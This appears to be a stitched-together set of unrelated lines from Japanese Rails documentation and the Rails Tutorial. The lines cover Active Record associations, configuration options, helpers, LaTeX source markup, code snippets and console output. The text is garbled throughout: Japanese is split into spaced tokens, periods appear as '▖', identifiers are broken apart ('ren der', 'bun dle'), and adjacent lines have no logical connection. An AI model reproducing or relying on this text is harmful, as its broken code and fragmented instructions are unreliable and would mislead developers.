関連 付け は 、 通常 双 方向 で 設定 し ま す ▟ 2 つ の モデル 両方 に 関連 を 定義 する 必要 が あ り ま す 。
###  スキーマ の 更新
ルート   ( root )   へ の ルーティング の ため の マッピング を 追加 する 。
$  git   rebase  master
#### select_datetime
Action   Mailer は ` Abstract Controller ` を 継承 し て い る の で 、 Action   Controller と 同様 に 一般 的 な ヘルパー メソッド を 使用 でき ま す 。
</ script>
Rails の デフォルト の ` has_many ` 関連 付け は 、 ほとんど の 場合 カスタマイズ 不要 で す が 、 時 に は 関連 付け の 動作 を カスタマイズ し た く な る こと も あ る と 思 い ま す 。
invoke    test _unit
フォロワー の 通知
change
####  content_ for
この 動作 は リテラル コンストラクタ と 同等 で す が 、 動作 の 内容 が 明確 に 示 さ れ て い ま す 。
これ は リスト \ ref{ code : will _ paginate_test } で 使用 さ れ て い ま し た 。
最終 的 な \ kode {correct\ _user } の 実装  
ここ で の 目標 は 、 Home ページ 、 Help ページ 、 About ページ を それぞれ 編集 し 、 最終 的 に ページ ごと に 異な る タイトル を 表示 する こと で す 。
test : mysql
ただし ` un derscore ` は 引数 を 取 り ま せ ん 。
この ファイル は 、 ( ` lib/blorgh/engine ▖rb ` に 置 か れ て い る )  `blorgh/engine ▖rb ` ファイル を require し 、 `Blorgh ` と い う 基本 モジュール を 定義 し ま す 。
関連 付け の メソッド は 、 すべて キャッシュ を 中心 に 構築 さ れ て い ま す ▟ 最後 に 実行 し た クエリ の 結果 は キャッシュ に 保持 さ れ 、 次回 以降 の 操作 で 使用 でき ま す 。
Java Script の 最小 化 プロセス は もう 少し 複雑 で す 。
   def welcome_email ( user ,   company)
### `uniqueness`
*   検索 さ れ た レコード の ソート 順 、 取り出 し た い 属性 、 グループ 化 の 有無 など を 指定 する
" you " や " your " を 使用 する 表現 を 避け る こと 。
上 の コード を 使用 する こと で 、 リスト \ ref{ code : password _ reset_email } の ログ に あ る リンク を 開 い た とき に パスワード 再 設定 の フォーム が 出力 さ れ る よう に な り ま す 。
\ href {https://en ▖wikipedia ▖org/wiki / Vacuous _ truth } { 無 意味 な テスト } で は な い こと に 注意 し て くださ い   ( \kode { followers } に つ い て も 同様 で す ) 。
</ section >
self を 省略 し た 結果 を リスト \ ref{ code :initial _ passing _ password_tests } に 示 し ま す 。
#   この ファイル に は Action Controller : : ParamsWrapper 用 の 設定 が 含 ま れ て お り
( 場合 に よ っ て は 、 \ texttt { Ctrl - C } を 使用 し て ローカル の Web サーバー を 再 起動 する 必要 が あ る か も しれ ま せ ん 。
「 はじめ に 」 で 約束 し た とおり 、 この Users リソース は すべて の Rails プロジェクト に 標準 装備 さ れ て い る scaffold ジェネレータ で 生成 し ま す 。
  >>  x   + =   1
投稿 し た 画像 を 扱 っ たり 、 その 画像 を Micropost モデル と 関連 付け する ため に 、 今回 は \ href {https://github▖ com/carrierwaveuploader/carrierwave } { CarrierWave } と い う 画像 アップ ローダー を 使 い ま す 。
ユーザー 一覧 ページ の モックアップ
( - 5 ▖ ▖ 5 ) ▖ to_a▖split  { |i|   i ▖ multiple_of ? (
*  `config▖ action_view▖embed_authenticity _ token_in_remote_forms ` は 、 フォーム で ` : remote => true ` を 使用 し た 場合 の ` authenticity _ token ` の デフォルト の 動作 を 設定 し ま す 。
リスト \ ref{ code : users _migration } の 場合 、 \ kode { change } メソッド は \ kode { create\_table } と い う Rails の メソッド を 呼 び 、 ユーザー を 保存 する ため の テーブル を データベース に 作成 し ま す 。
以下 の ディレクトリ は 、
ユーザー の プロファイル ページ に タイトル と 見出し を 追加 する 。
image_ path ( " edit▖ png " )  # => /assets/edit▖ png
c ▖ first _ name  = =  o▖ customer▖ first _ name  # => true
サイト 監視 用 に \ href { http://scoutapp▖ com/}{ Scout } と \ href { http://www ▖newrelic ▖ com/}{ New  Relic } { p 2 } の 導入 を 検討 する こと も お 勧め いた し ま す 。
=>   " 42 8177 foobar "
      <td ><%=  article ▖ text   %></td>
この ユーザー オブジェクト を データベース に 実際 に 保存 する に は 、 \ kode {user } 変数 に 対 し て \ kode {save } メソッド を 呼 び ま す 。
それ に 続 い て 、 関連 付け に 関 する さまざま な ヒント や 活用 方法 、 Rails の 関連 付け メソッド と オプション の 完全 な 参照 物 も ご 紹介 し ま す 。
*   FROM   " users "   WHERE   " users " ▖ " state "   =  'active'   AND   " users " ▖ " state "   =  'finished'
User モデル の \ kode { followed_users } 関連 付け を 追加 する 。
Client ▖find_ by !  
外部 キー を 使用 する 場合 に は 、 マイグレーション で 明示 的 に 定義 する 必要 が あ り ま す 。
  # @@emulate_booleans に アクセス でき る クラス メソッド を 生成 する
    <%=  ren der   partial :   " form " ,   locals : {zone : @zone } %>
Permis sion   is   hereby  granted ,   free   of   charge ,   to  any  person
    has _one   : profile
    module   Dependencies
` : inverse _of ` オプション は 、 その 関連 付け の 逆 関連 付け と な る ` has_many ` 関連 付け また は ` has _one ` 関連 付け の 名前 を 指定 し ま す 。
EXPLAIN の 出力 を 解釈 する こと は 、 本 ガイド の 範疇 を 超え ま す 。
Rails を はじめ よう ╼ = = = = = = = = = = = = =
#   ライブラリ
   Loading   test   environment
   background - color :   red ;
In   Chapter   \ ref { cha : following _ users } ,  we’ll  see  an   example   w here   REST   principles  allow   us   to   model  a   subtler   problem,   “ following   users ” ,   in  a  natural   and   convenient   way ▖
   validates : card_number ,   presence :  true ,   if: : paid_ with _card ?
$ bun dle   exec   guard
上 の 例 で は 、 アセット 読み込 み パス の いずれ か に あ る 画像 ファイル   ( `app/assets/images/image▖ png ` など )   が 指定 さ れ た と 解釈 さ れ ま す 。
*   得 られ た 結果 を 行 ごと に 同等 の Ruby オブジェクト と し て インスタンス 化 し ま す 。
デフォルト の XML ビルダ は 、 ` Builder : : Xml Markup ` から 直接 生成 さ れ た インスタンス で す 。
\ texttt { Gemfile } へ \ kode {bootstrap - sass } を 追加 する
` ▖erb ` レイアウト が な い 場合 、 `▖builder ` レイアウト が あ れ ば それ を 使用 し ま す 。
`ren der ` で 指定 でき る ほとんど の オプション で は 、 出力 さ れ る コンテンツ は 現在 の レイアウト の 一部 と し て ブラウザ 上 で 表示 さ れ ま す 。
ただし 、 docrails に は プルリクエスト を 送信 し な い で くださ い ▟ 自分 で 書 い た 変更 へ の 意見 が 欲し い 場合 は 、 [ Rails ] ( http://github▖ com/rails/rails ) の 方 で お 願 い し ま す 。
この コマンド を 実行 する だけ で 、 指定 の ディレクトリ に Rails アプリケーション の スケルトン を 簡単 に 作成 でき ま す 。
また 、 本書 を 卒業 し て 実際 の 開発 に 携わ る とき の ため に 、 \ ref{ sec : following_ conclusion } で 役立 つ リソース 集   ( 読み物 ガイド )   に つ い て も 紹介 し ま す 。
     message:  " %{ value } は 有効 な 値 で は あ り ま せ ん "  } , allow_ nil :  true
リスト \ ref{ code : password _ reset_form } で は 以下 の フォーム タグ ヘルパー を 使用 し て い る 点 に ご 注意 くださ い 。
class   Customer <  ActiveRecord : : Base
` : primary _key ` オプション で 主 キー を 明示 的 に 指定 する こと で これ を 上書き する こと が でき ま す 。
require_tree の 詳細 に つ い て は [ マニフェスト ファイル と ディレクティブ ] ( # マニフェスト ファイル と ディレクティブ ) を 参照 し て くださ い 。
リスト \ ref{ code : test _helper_ log _ in } の とき
puts p ▖ name  #  " Some  Book "
$ bun dle   exec   rake   test ╼ 3   tests ,   6   assertions ,   1   failures ,   0   errors ,   0   skips
Users コントローラ は 、 ユーザー の 一覧 を \ kode {@users } 変数   ( @ は Ruby の インスタンス 変数 を 表 す )   に 保存 し 、 \ kode {index } ビュー に 渡 す 。
本番 環境 で の 画像 アップロード を 調整 する
( 最初 の 2 行 の 設定 以外 は 必須 で は あ り ま せ ん 。
self を 省略 し た 結果 を リスト \ ref{ code : adding_ the_about_ page } に 示 し ま す 。
|  ` Deer`        | ` deers`        |
重複 の な い 一意 の カテゴリー が 必要 な 場合 は 、 ` Category ▖ joins(:article ) ▖uniq ` を 使用 でき ま す 。
しかし 、 HTML ドキュメント に 直接 コード を 埋め込 む と ( XSS に よ っ て これ が 生じ る こと が あ り ま す ) 、 この プロパティ を 読み書き でき て しま い ま す 。
Aaron   Patterson の   [ hana ] (https://github▖ com/tenderlove / hana )   gem が 代表 的 で す が 、 最新 の 仕様 変更 を すべて サポート し て い る わけ で は あ り ま せ ん 。
" Product " ▖ deconstantize                        # => " "
╼╼  \ subsection { 最初 の テスト } %  ( fold) ╼  \ label{ sec :our_first_test } ╼╼
   belongs_to  : assembly
期待 どおり に 動作 する こと は 、 Active   Support の ` test/core _ext/ date_ext _ test ▖ rb ` 用 の テスト スイート で 確認 でき ま す 。
    has_many  : orders ,   class_ name :  " Transaction "
*   Rails   4 ▖ 0 から ` ActiveSupport: :KeyGenerator ` が 導入 さ れ 、 署名 付き cookies の 生成 と 照合 など に 使用 さ れ る よう に な り ま し た 。
#     < name > Jeremy   Kemper</ name >
following / follower を テスト する ため の リレーションシップ 用 fixture
* `new_ photo _ path ` は `/photos/new ` を 返 し ま す
この メソッド は ` console ` ブロック で 使用 する の が 最適 で す 。
#### `transform_values ` と `transform_values ! `
`match ` メソッド と `: via ` オプション を 使用 する こと で 、 複数 の HTTP 動詞 に 同時 に マッチ する ルーティング を 作成 でき ま す 。
リソース フル ルーティング で は 大袈裟 過ぎ る 場合 に 、 アプリケーション を 無理 に リソース フル な フレームワーク に 押し込め る 必要 は あ り ま せ ん 。
スパム コメント を 削除 でき る よう に する の も 、 この ブログ で は 重要 な 機能 で す 。
class   GoodnessValidator  <  ActiveModel : : Validator
╼/ db /*▖sqlite 3 ╼/ db /*▖sqlite 3 - journal ╼╼#  Ignore   all  logfiles  and  tempfiles ▖
  $( " # new_ article " ) ▖ on ( " ajax: success " ,   ( e ,   data ,  status ,   xhr )   ->
ユーザー の 一覧 、 ページ ネーション 用 リンク 、 移動 用 の   [ Users ]   リンク の モックアップ を 図 \ ref { fig :user_ index_ mockup } に 示 し ま す
` add ` メソッド を 使用 し て 、 特定 の 属性 に 関連 する メッセージ を 手動 で 追加 でき ま す 。
ハイフン   (-)   が 入 っ て い る ため に エラー が 発生 し て しま い ま す 。
//= require_tree   ▖
統合 テスト で は 、 ユーザー が Web ブラウザ で アプリケーション と やりとり する 操作 を シミュレート でき る の で 特に 強力 で す 。
javascript_tag   " alert ( ' All   is   good ') "
ビュー の 役割 は 、 この 情報 を ユーザー が 読め る 形式 で 表示 する こと で す 。
*   必要 な 拡張 機能 だけ を 利用 する 方法
ここ で 非常 に 便利 な の が ` and   return ` と い う メソッド で す 。
\emph { Rails チュートリアル } を 最後 まで 読 み 終わ る 頃 に は 、 重要 な コマンド は 一通り 使え る よう に な っ て い る こと で しょ う 。
この プリ プロセス 順序 は 非常 に 重要 で す の で 、 心 に 留め て お い て くださ い 。
\ kode {bun dle  install } コマンド の 実行 に は しばらく 時間 が かか る か も しれ ま せ ん ▟ 完了 後 、 アプリケーション が 実行 可能 に な り ま す 。
これ は リスト \ ref{ code : new_edit_ partial } で 使用 さ れ て い ま し た 。
       association_foreign_key:   "other_user_ id "
安全 な 文字 列 と は 、 HTML に その まま 挿入 し て も 問題 が な い と い う マーク が 付け られ て い る 文字 列 で す 。
つまり 、 最初 の 例 の \ kode {str } を 別 の 変数 名   ( \kode { the_function_argument } など )   に 変更 し て も 、 メソッド の 呼び出 し 方 は 全く 同じ で す 。
Rails   2 ▖ 1 ▖ 2 より 前 の バージョン ( および Ruby ) に 含 ま れ る バグ が 原因 で 、 ハッカー は 以下 の よう に 任意 の ヘッダ を 注入 でき て しま い ま す 。
   belongs_to  : customer ,   touch :  :orders_updated_at
* `ActiveSupport: : Cache: : Store ▖ logger ` は 、 キャッシュ ストア 操作 で 使用 する ロガー を 指定 し ま す 。
``` ruby
この 節 で 定義 する \ kode {belongs\_to}/\kode { has\_many } 関連 付け を 使用 する こと で 、 表 \ ref{table : association_methods } に 示 す よう な メソッド を Rails で 使え る よう に な り ま す 。
1 つ の relationship テーブル を 使 っ て 2 つ の モデル   ( 能動 的 関係 と 受動 的 関係 )   を シミュレート する 方法 に つ い て は 、 \ ref{ sec : following } で 説明 し ま す 。
ログ アウト 用 リンク が 表示 さ れ て い る こと を 確認 する
   self ▖emulate_booleans   =  true
フォロー 関連 の 機能 の 実装 は この とおり 完了 し ま し た が 、 ステータス フィード に 取りかか る 前 に もう 一 つ だけ 機能 を 洗練 さ せ て み た い と 思 い ま す 。
これ ら の 拡張 を 1 つか 2 つ で も 実装 し て み る こと で 、 本書 から 巣立 っ て 自分 の アプリケーション を 書 く とき に きっと 役 に 立 つ こと で しょ う 。
基本 タイトル を 含め た StaticPages コントローラ の テスト   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
*   これ ら の 同等 な メソッド が 実行 する SQL は 、 従来 の 実装 と 同じ で は あ り ま せ ん 。
{ 0 } 図 12 ▖ 2 { / 0 }   { 1 } フォロー する 相手 を 見つけ る { / 1 }
umerate}╼╼    %  subsection  a_working _ follow_button_with _ajax  ( end ) ╼╼  \ subsection { フォロー を テスト する } %  ( fold) ╼  \ label{ sec : following _ tests}╼╼
最初 に 、 有効 な メール アドレス と 無効 な メール アドレス の コレクション に 対 する テスト を 行 い ま しょ う 。
この 段階 で テスト を 実行 し て み る と 、  \ passing   に な り ま す 。
WIP :   この リスト に まだ 含 ま れ て い な い ヘルパー が あ り ま す 。
*  `config▖ active_ record ▖dump_schema_after_migration ` は 、 マイグレーション 実行 時 に スキーマ ダンプ ( ` db /schema▖ rb ` また は ` db /structure▖ sql` ) を 行な う か どう か を 指定 し ま す 。
Sublime  Text は \ href { http://macromates▖ com} { Text Mate } の 影響 を 強 く 受け て い ま す ▟ 実際 、 スニペット や カラー スキーム など の 設定 は Text Mate と 互換 性 が あ り ま す 。
*  `around_enqueue `
*  `config▖ active_ support▖time_precision ` は 、 JSON エンコード さ れ た 時間 値 の 精度 を 指定 し ま す 。
ユーザー の \ kode { followed_users } の 配列 を 作成 する に は 、 \ kode { followed_ id } の 配列 を 取り出 し 、 それぞれ の id ごと に 対応 する ユーザー を 見つけ 出 し ま す 。
#### `find _each `
\ chapter { ユーザー の マイクロ ポスト }╼\ label{ cha :user_microposts}╼╼
date▖end _of_ hour # =>  Mon   Jun   0 7   19 : 59 : 59   + 0200   2010
    <%=  f▖ text _field : commenter   %>
Cucumber の フィーチャー は 非常 に 読 み やす い の で す が 、 その 代わり 実装 さ れ て い る コード から 完全 に 切り離 さ れ て い て 、 両刃 の 剣 で す 。
content-type を 変更 し た い 場合 は 、 `: content_type ` オプション を 指定 し ま す 。
こう し た 不要 な 出力 行 を 除去 する ため に 、 バック トレース を フィルタ し ま す
` has_many ` 関連 付け は 、 他 の モデル と の 間 に 「 1 対 多 」 の つながり を 作成 し ま す 。
\emph { ヒント } :   { 1 } log _ in_as { / 1 } ヘルパー を 使 っ て リスト { p 2 } に テスト を 追加 し て み ま しょ う 。
self を 省略 し た 結果 を リスト \ ref{ code :puma_gemfile } に 示 し ま す 。
[ * object ]
client  =  Client▖take ( 2 )
利用 可能 な すべて の オプション に つ い て は 、 「 Action   Mailer の 全 メソッド 」 セクション で ユーザー 設定 可能 な 属性 を 参照 し て くださ い 。
( なお 、 リダイレクト に よ っ て edit 用 の テンプレート が 描画 さ れ な く な っ た の で 、 リスト \ ref{ code : friendly _ forwarding _ test } で は 該当 する テスト を 削除 し て い ま す )
  </p>
この 改修 が 終わ る と 、   リスト \ ref{ code : home_view_ interior } 、 リスト \ ref{ code :help_view_ interior } 、 リスト \ ref{ code :about_view_ interior } の よう に 実 に 簡潔 で 美し い コード に な り ま す 。
この コード を 使 っ て Micropost モデル を 更新 し た 結果 を 、 リスト \ ref{ code :micropost _ordering } に 示 し ま す 。
リスト { p 0 } の { 2 } @user{ / 2 } インスタンス 変数 使 う と 、 編集 ページ が うま く 描画 さ れ る よう に な り ま す   ( 図 \ ref { fig : edit_ page } ) 。
新し い パスワード 再 設定 画面 ビュ
### I 18 n オプション で available_ locales リスト の 使用 が 強制 さ れ る
` Regexp ` の 拡張
どちら の 依存 gem も 、 アプリケーション で ` bun dle  install ` を 実行 する とき に インストール さ れ ま す 。
マイクロ ポスト の ユーザ と の 関連 付け の テスト 。
これ は リスト \ ref{ code :user_factory } で 使用 さ れ て い ま し た 。
この レイアウト ファイル を 有効 に する に は 、 前述 の デフォルト の タイトル 部分 を 以下 の ERB コード に 差し替え ま す 。
    INNER   JOIN  articles   ON   articles ▖category _ id   =  categories ▖id
% w ( a b  c  d ) ▖ from ( 2 )    # => % w ( c  d )
` Picture ` モデル の インスタンス が あ れ ば 、 `@picture ▖ imageable ` と する こと で 親 を 取得 でき ま す 。
has_many : through 関連 付け の 図 ] ( images/has_many_ through ▖ png )
上 の コード で は 、 この 関数 を 呼 ん で い ま す 。
リスト \ ref{ code : sample_relationships} は 、 リレーションシップ の サンプル データ を 生成 する ため の コード で す
<% = stylesheet_link_tag   " application " ,   media :   " all "  %>
  >>  Rails ▖env▖ test ?
{ 0 } 図 3 ▖ 10   { / 0 } { 1 } ファイル ナビゲーター 内 の 隠し ファイル を 表示 する { / 1 }
コア チーム は 、 必要 に 応 じ て バグ か 機能 か を 審査 する ため の 招集 を かけ る こと も あ り ま す 。
self ▖ class_eval   %{
これ は リスト \ ref{ code : full _feed_test } で 使用 さ れ て い ま し た 。
    errors▖ add(:name ,   " 以下 の 文字 を 含 む こと は でき ま せ ん   !
#   Ignore   all  logfiles  and  tempfiles ▖
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ range/include _range ▖ rb ` で す 。
self を 省略 し た 結果 を リスト \ ref{ code : destroy _ forget } に 示 し ま す 。
アセット キャッシュ ストア を 無効 に する に は 以下 の よう に し ま す 。
\ kode { CGI ▖ escape HTML } で HTML の エスケープ 処理 を 使 っ て い る 点 に 注目 し て 、 なぜ これ が 必要 な の か 考え て み て くださ い 。
レシーバ 自体 の キー に 対 し て 破壊 的 な ブロック 操作 を 適用 する ` transform_values ! ` メソッド も あ り ま す 。
rescue
$  cp   README ▖ rdoc  README ▖ md
\ ref{ sec : remember_tests } で も 説明 し ま す が 、 この 設計   ( および 若干 の リファクタリング )   の おかげ で 認証 メカニズム の テスト が 行 い 易 く な り ま す 。
最終 的 な サンプル アプリケーション は 、 ( 偶然 に も 、 かつて は Rails で 実装 さ れ て い た )   \ href { http://twitter▖ com/} { 某 ソーシャル マイクロ ブログ サイト } に とても よく 似 た 仕上がり に な り ま す 。
変更 す べ き 点 は 、 以下 を
< h 1 >Editing   article </ h 1 >
    以下 の よう に 変更 し て くださ い 。
* `:greater_than`  -   指定 さ れ た 値 より も 大き く な けれ ば な ら な い こと を 指定 し ま す 。
##### ` beginning _ of _week` 、 `end _of _week`
ヘッダー インジェクション が 実行 可能 に な っ て しま っ て い る 場合 、 レスポンス 分割 ( response  splitting ) 攻撃 も 同様 に 実行 可能 に な っ て い る 可能 性 が あ り ま す 。
number_ with_ delimiter ( 123456 78 )  # = >  12 , 345 ,67 8
この 章 で は 、 アプリケーション に \emph { Bootstrap } フレームワーク を 組み込 み 、 そして 、 カスタム スタイル を 追加 し ま す
バリデーション の いずれ か が 失敗 する と 、 オブジェクト は 無効 ( invalid ) と マーク さ れ 、 Active   Record で の ` INSERT ` や ` UPDATE ` 操作 は 行 わ れ ま せ ん 。
その 後 この リンク は アセット パイプライン に よ っ て 利用 可能 に な り ま す 。
( 同じ こと は 、 文字 列 と ハッシュ など 、 他 の Ruby の データ 構造 で も 発生 し ま す ) 。
上 の コード の 結果 は 以下 の よう に な り ま す 。
これ は リスト \ ref{ code : account_activations _ route } で 使用 さ れ て い ま し た 。
\ ref{ sec :a_test _ for _ invalid _ submis sion } で 書 い た 無効 な 送信 に 対 する テスト と 同様 に 、 今回 の 目的 は データベース の 中身 が 正し い か どう か 検証 する こと で す 。
表 \ ref{table : password_token_digest } に 両者 の 似 て い る 点 を 示 し ま す   ( \ ref{ sec : password _ reset } の パスワード 再 設定 も 含 む ) 。
以下 を 計算 し ま す 。
これ に 対応 する アプリケーション コード は 、 Users コントローラ の \ kode {edit } アクション の 中 に 書き込 み ま す 。
xhr   : get , : index,   format :  : js
たとえば 、 以下 の よう に 文字 列 を 含 む 配列 が あ る と し ま す 。
\ texttt { Gemfile } に \ kode {will _ paginate } を 追加 する
    mattr_accessor   : history
    $( " # new_ article " ) ▖ append   " <p > ERROR </p > "
次 の 部分 に は ハッシュ が あ り ま す 。
*   Rails   4 ▖ 0 の ` ActiveModel : : Serializers: : JSON ▖ include _root_ in_json ` の デフォルト 値 が ` false ` に 変更 さ れ ま し た 。
たとえば 、 css アセット ファイル に `erb ` と い う 拡張 子 を 追加 する と   ( `application ▖css ▖erb ` など ) 、 CSS ルール 内 で ` asset_path ` など の ヘルパー が 使用 でき る よう に な り ま す 。
第 1 章 の 最後 に は 、 作成 し た アプリ を 早々 に 本番   ( production )   環境   ( \ ref{ sec : deploying } )   に \emph { デプロイ し て 一般 公開 する } ところ まで 実践 し ま す 。
その 理由 に つ い て は 第 \ ref { cha : modeling _ users } 章 で 説明 し ま す ) 。
クラウド IDE を ご 利用 の 場合 は 、 オ ススメ の irb の 設定 が あ り ま す 。
従 っ て 、 特定 の 文字 列 に 対 し て ` html_safe ` メソッド を 呼び出 す 際 に は 、 その 文字 列 が 本当 に 安全 で あ る こと を 確認 する 義務 が あ り ま す 。
*   特定 の レコード が 存在 する か どう か を チェック する
###  ルーティング を テスト する
[ user ] ▖ to _ formatted_s(:db )         # =>  " 845 6 "
サンプル データ 生成 コード に 管理 者 を 1人 追加 する
= >  Object
この キャッシュ は スレッド セーフ で は あ り ま せ ん 。
最後 に \ ref{ sec : adding _ page_titles } の テスト を 実行 し て 、 タイトル を 壊 し て い な い こと を 確認 し ま す 。
上 の コード は 、 デコレータ だけ で は な く 、 メイン の アプリケーション から 参照 さ れ な い すべて の エンジン の コード を 読み込 み ま す 。
Comment モデル の 内容 は 、 これ まで に 見 た ` Article ` モデル と 非常 に よく 似 て い ま す 。
   default   from :  " from @example ▖ com "
user▖ name  =  " David "
   <option   value = " 4 " > Rwanda < /option >
それ に よ り 、 ` rake   assets: precompile ` が 実行 さ れ た とき に エンジン の アセット を 追加 する よう sprockets に 指示 さ れ ま す 。
C ▖ subclasses # => [ B ]
second : two
マイグレーション は Ruby の クラス で あ り 、 データベース テーブル の 作成 や 変更 を 簡単 に 行 う ため の しくみ で す 。
REST アーキテクチャ に 初めて 触れ た
### DateHelper
#### strip_tags(html )
#   リレーション 経由
ここ で は Rails コンソール の よう に コマンド を 呼び出 す こと が でき て 、 アプリケーション の 今 の 状態 を 確認 する こと が でき ま す 。
Missing   template   articles/new ,  application/new with  { locale : [ :en ] ,   formats: [ :html ] ,   handlers: [ :erb ,  :builder ,  : coffee ] }▖ 
* =  require   layout
Response ヘッダー に は 、 たとえば ステータス コード 、 Cookie フィールド 、 Location フィールド   ( リダイレクト 先 を 表 す )   が あ り ま す 。
Client ▖ limit ( 1 ) ▖ pluck(:name )
` association ` メソッド は 関連 付け られ た オブジェクト を 返 し ま す 。
バージョン 情報 を 確認 し て くださ い 。
<optgroup   label= " Asia " >
この 節 で は 、 アカウント 有効 化 の 統合 テスト を 追加 し ま す 。
テスト の 結果 を 図 \ ref { fig: riding _ rails_environment } に 示 し ま す 。
c 2   =   Client ▖find ( 1 )
バージョン を 指定 し て Rails を インストール する 。
`ren der ` メソッド は 、 メソッド 呼び出し の 際 に ` : inline ` オプション を 使用 し て ERB を 与え る と 、 ビュー が まったく な い 状態 で も 実行 する こと が でき ま す 。
    mid dlewares  <<  [ :: Rack : : ContentLength ]
  $ rails   destroy    controller   FooBars  baz  quux
invoke    css
[ ] ▖append ( [ 1 , 2 ] )          # =>  [ [ 1 , 2 ] ]
self を 省略 し た 結果 を リスト \ ref{ code : signup_flash } に 示 し ま す 。
次 の ページ で 右上隅 の   [ New pull   request ]   を 押 し ま す 。
これ は リスト \ ref{ code : password_tests } で 使用 さ れ て い ま し た 。
category ▖ articles ▖ created_before ( time)
その 他 に 、 一定 時間 が 経過 する と セッション を 期限 切れ に する モデル も あ り ま す 。
Date▖ new (2010 ,   2 ,   28 ) ▖ advance ( days :   1 ) ▖ advance ( months :   1 )
以下 の コマンド を 実行 し て 解決 し ま す 。
` beginning _ of_minute ` は ` at_beginning _ of_minute ` の 別名 で す 。
  #< Client   id :   2 ,  first _ name :  " Fifo " > ,
    mail ( to : @user ▖email ,
値 が ` nil ` や 空 文字 で あ る   ( つまり 空欄 また は ホワイト スペース で あ る )   か どう か を 確認 する ため に 、 内部 で は ` present ? ` メソッド を 使用 し て い ま す 。
    ' Header - Name' => ' Header - Value ' ,
ところ で 、 Heroku の デプロイ する とき 、 もし か し た ら 次 の よう な 警告 メッセージ を 目 に し た こと が あ る か も しれ ま せ ん 。
    EOT
      email ▖ attachments ▖each   do  | attachment |
この 節 の 冒頭 で データベース を リセット し て あ る の で 、 現 時点 で は \ kode {User ▖ count } は \ kode { 0 } に な っ て い ま す 。
Article ▖find ( 10 ) ▖ comments▖ reorder ( ' name ')
\ kode {remember\_digest } は User モデル の 属性 で あ り 、 モデル 内 で は 以下 の よう に 書き換え る こと が でき ま す 。
以下 は 述語 の 例 で す 。
さらに 、 Rails で は 以下 の よう な コード で は \emph { 名前 付き ルート } を 使用 する の が 慣例 と な っ て い ま す 。
ユーザー インデックス の ページ ネーション 。
    "#{ active_ record ▖ name ▖ demodulize▖un derscore ▖ pluralize}_count "
オーナー オブジェクト が destroy さ れ た 時 に 、 それ に 関連 付け られ た オブジェクト を どう する か を 制御 し ま す 。
       class  Engine  < : : Rails : : Engine
( メール が 見え る まで 多少 スクロール が 必要 で しょ う ) 。
   validate  do  | person |
    options [ "type " ]  =  " checkbox "
テーブル を 実際 に 作成 する に は ` rake   db : migrate ` を 実行 し ま す ▟ ロール バック する に は ` rake   db : rollback ` を 実行 し ま す 。
` app/views/welcome/index▖html ▖erb ` を 開 い て 以下 の よう に 変更 し て くださ い 。
Rails は 複数 の キー インデックス を サポート し て い る
class  User Mailer <  Application Mailer
実際 に は 、 以下 の 同等 の コード を
email :   params [ :email ] )
|                     |   403                | : forbidden                       |
この よう な コード が あ る 場合 は 、 以下 の よう に 書き換え な けれ ば な り ま せ ん 。
クラス 自身 が 使用 さ れ て い る と 、 Rails は その クラス を 読み込 ん で 関連 する テーブル を 参照 し よう と し ま す 。
次 に 、 フォロー 用 と フォロー 解除 用 の フォーム を 作成 し ま す ▟ それ から 、 フォロー し て い る ユーザー と フォロワー の 一覧 を 表示 する 専用 の ページ を 作成 し ま す 。
          subject :  'Welcome to  My   Awesome  Site ' ,
c 2 ▖ name  =  " should  fail "
本当 に Java Script を リモート の ` < script > ` タグ から 読み込 む の で あ れ ば 、 その アクション で は CSRF 保護 を スキップ し て くださ い 。
この メソッド は スコープ を すべて 解除 し 、 テーブル に 対 し て 通常 の   ( スコープ なし の )   クエリ を 実行 する よう に し ま す 。
名前 付き パラメータ を 持 つ ルーティング に プレフィックス を 追加 する こと も でき ま す 。
#  Use   Coffee Script   for   ▖ js▖ coffee   assets  and   views
require   'active_ support/core _ext/object/blank'
=>   " 3   errata "
   user_ name :            '< ユーザー 名 > ' ,
< h 1 > Products</ h 1 >
で は 、 サンプル ユーザー を 生成 する Rake タスク を 追加 し て み ま しょ う ▟ Rails で は \ kode {db/seeds▖rb } と い う ファイル を 標準 と し て 使 い ま す 。
さらに 読 み やす い 別 の 方法 と し て 、 ハッシュ 条件 を ネスト さ せ る 方法 が あ り ま す 。
ソース の ファイル 名 に 拡張 子 ` ▖ css ` が な い 場合 は 自動 的 に 補 わ れ ま す 。
事前 設定 済み の クラウド 環境 を 利用 する こと で 、 Rails の インストール 、 アプリケーション の 生成 、 生成 さ れ た ファイル の 編集 を 簡単 に 行 う こと が でき る 。
#### ` assert_recognizes ` アサーション
リンク テキスト を 残 し て リンク タグ を すべて 削除 し ま す 。
たとえば 、 モデル の テスト 用 に ` test/models ` ディレクトリ を 作成 し て も 構 い ま せ ん 。
この 構文 を コンソール で 確かめ て み ま しょ う 。
\ ref{ sec :user_micropost _associations } の マイクロ ポスト の とき と 同様 、 以下 の よう な ユーザー 関連 付け の コード を 使用 し て 新し い リレーションシップ を 作成 し ま す 。
アプリケーション の ルート パス を 省略 し て 、 単純 に \ kode {config/ routes▖rb } と 表記 する こと に し ま す 。
    resources  : quotes
従 っ て 、 関連 付け 名 が 誤 っ て 複数 形 に な っ て しま っ て い る と 、 そこ から 推測 さ れ る クラス 名 も 誤 っ て 複数 形 に な っ て しま い ま す 。
ついに Rails アプリケーション を 最後 まで 完成 さ せ ま し た 。
マイクロ ポスト を 新規 作成 する アクション
動作 の 詳細 を 知 り た い 場合 は 、 Stack   Overflow の \ href { http://stackoverflow ▖ com/questions/941594 /un derstand - rails - authenticity - token } { Rails 信頼 性 トークン 関連 の 書き込み   ( 英語 ) }   を 参照 し て くださ い 。
最後 に 、 ステータス フィード の 完成 版 を 実装 し ま す   ( \ ref{ sec : the_status _feed } ) 。
     format▖html
\ ref{ sec : signup _ form } の 冒頭 で データベース を リセット し て あ る の で 、 現 時点 で は \ kode {User ▖ count } は \ kode { 0 } に な っ て い ま す 。
ユーザー 表示 ページ に Gravatar の デフォルト 画像 が 表示 さ れ て い る
               : set_bu siness_headers
Rails の コード に 貢献 する
>> p ▖errors ▖ messages
能動 的 関係 を とお し て フォロー し て い る ユーザー を 取得 する 模式 図
ここ で 行 わ れ て い る リダイレクト は 、 HTTP ステータス で 言 う 「 301   " Moved   Permanently " 」 で あ る こと に ご 注意 くださ い 。
Active   Support で は 、 この 他 に も 便利 な ハッシュ の マージ を いく つ か 提供 し て い ま す 。
